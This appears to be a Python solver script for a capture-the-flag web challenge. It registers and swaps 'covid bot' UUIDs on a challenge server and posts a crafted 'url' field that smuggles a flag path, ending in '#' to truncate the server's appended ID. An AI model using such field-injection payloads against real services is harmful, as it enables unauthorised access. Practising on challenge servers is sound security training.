import requests

sample_bot_id = '00000000-0000-4000-8000-000000000000'

URL = 'http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41051'
PARAMS = {}
HEADERS = {}
#requests.post(url, data={key: value}, json={key: value}, args)

# registers UUID associated with covid bot to database
def getRegisterCovidBot(secret, newID):
    data = {'COVID_SECRET': secret, "newID" : newID}
    data.update(PARAMS)
    
    reqData = requests.get(URL+"/register-covid-bot", headers=HEADERS, params=data)
    return reqData

# Change a known registered UUID
def postRegisterCovidBot(oldID, newID):
    headers = { 'x-covid-bot' : oldID}
    headers.update(HEADERS)

    data = {"newID" : newID}
    data.update(PARAMS)
    data = {
        "newBotID":"aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaac",
        "oldBotID":"aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaab",
        "url":"web_challenge_5_dummy/flag/42#"
    }
    reqData = requests.post(URL+"/register-covid-bot", headers=headers, data=data)
    return reqData

# Fetch Resource
def fetchResource(url, oldBotID, newBotID):
    gourl = f'{url}/{newBotID}' #url = COVID_BACKEND
    reqData = requests.get(gourl, headers=HEADERS, params=PARAMS)
    return reqData

def randomGet(ext='', data={}):
    reqData = requests.get(URL+ext, headers=HEADERS, params=data)
    return reqData

#print(getRegisterCovidBot('COVID_SECRET', sample_bot_id).text)
print(postRegisterCovidBot(sample_bot_id, sample_bot_id).text)
#print(fetchResource(URL, sample_bot_id, sample_bot_id).text)
#print(randomGet().text)

